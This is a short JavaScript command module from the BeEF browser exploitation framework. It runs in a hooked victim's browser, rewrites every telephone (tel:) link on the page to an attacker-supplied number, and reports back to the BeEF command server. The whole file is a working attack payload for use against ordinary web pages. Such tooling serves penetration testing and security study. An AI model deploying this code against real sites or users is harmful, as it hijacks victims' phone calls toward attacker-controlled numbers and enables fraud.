//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
beef.execute(function() {

	var tel_number = "<%= @tel_number %>";
	var selector   = "a";

	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result='+beef.dom.rewriteTelLinks(tel_number, selector)+' telephone (tel) links rewritten to '+tel_number);

});

